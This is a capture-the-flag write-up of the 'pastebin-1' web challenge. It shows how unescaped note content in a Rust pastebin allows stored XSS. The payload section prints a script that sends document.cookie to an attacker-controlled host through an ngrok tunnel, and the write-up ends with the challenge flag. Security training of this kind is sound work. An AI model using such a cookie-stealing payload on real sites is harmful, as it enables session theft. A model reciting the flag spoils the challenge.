# Challenge Name: pastebin-1


![date](https://img.shields.io/badge/date-10.07.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![web category](https://img.shields.io/badge/category-Web-blueviolet.svg)   
![value](https://img.shields.io/badge/value-103-blue.svg)  


## Description

Ah, the classic pastebin. Can you get the admin's cookies?

pastebin-1.mc.ax

Admin bot https://admin-bot.mc.ax/pastebin-1 

Author : NotDeGhost

[main.rs](main.rs)

## Detailed solution

Opening the challenge link https://pastebin-1.mc.ax/

![image](https://user-images.githubusercontent.com/72421091/125499621-b9a44b65-1b88-40c2-ba7d-e37cd164b15e.png)

We can create notes

![image](https://user-images.githubusercontent.com/72421091/125499707-4f69ae48-8ca8-4b8c-a5ea-997482c0a6ea.png)
  
```html
<link rel="stylesheet" href="/style.css" /><div class="container">test</div>
```
Let's check the source code [main.rs](main.rs) 

We have a Rust web app, let's check the functions create and view notes 

```rust
async fn create(mut req: Request<State>) -> tide::Result {
    let Paste { content } = req.body_form().await?;
    let id = "abcdefghijklmnopqrstuvwxyz"
        .chars()
        .collect::<Vec<char>>()
        .choose_multiple(&mut rand::thread_rng(), 16)
        .collect::<String>();
    req.state().value.write().unwrap().insert(id.clone(), content);
    Ok(Redirect::new(format!("/view?id={}", id)).into())
}
```

```rust
async fn view(req: Request<State>) -> tide::Result {
    let Page { id } = req.query()?;
    let response = match req.state().value.read().unwrap().get(&id) {
        Some(content) => Response::builder(200)
            .content_type("text/html")
            .body(format!("\
                <link rel=\"stylesheet\" href=\"/style.css\" />\
                <div class=\"container\">\
                    {}\
                </div>\
            ", content)).build(),
        None => Response::builder(404).build()
    };
    Ok(response)
}
```
**Create** function save the POST request data and generate an id to view it with the **view** function

The **view** function output the content inside an html div  

So clearly we can put a javascrit code insid the note 

Let's test it

![image](https://user-images.githubusercontent.com/72421091/125501377-0a7ca4b0-15d5-48ba-b776-de33c720176d.png)

![image](https://user-images.githubusercontent.com/72421091/125501409-f5e35964-9e5a-44ab-bd45-e26fd85e8679.png)

We can use some XSS attacks

As mention in the description we need to seal the admin cookie

We can use some payload to steal the cookie https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md  

```javascript
<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
```
I have some probleme with port forwarding so i'm gonna use ngrok to create an http tunnel

- ngrok http 8000

![image](https://user-images.githubusercontent.com/72421091/125504832-861866f6-e66b-44f5-af52-e9c9150a7d1a.png)

- python http server

![image](https://user-images.githubusercontent.com/72421091/125503384-9e368242-1e94-4cc6-8ed1-7845c0b61cd9.png)

Let's create our payload 

![image](https://user-images.githubusercontent.com/72421091/125503692-56d686b7-b516-4f2b-ab96-dd3717863df4.png)

https://pastebin-1.mc.ax/view?id=cmvqigpkulajysnr

Let's go to the admin portal to submit our malicious note https://admin-bot.mc.ax/

![image](https://user-images.githubusercontent.com/72421091/125503967-0a6aeab7-1a92-4714-875e-507214ea9a16.png)

After submitting, the admin gonna visit our note

![image](https://user-images.githubusercontent.com/72421091/125504702-f9c86244-214c-4217-8fa0-af9d4fef6bfc.png)

We got our flag

## Flag

```

flag{d1dn7_n33d_70_b3_1n_ru57}
```
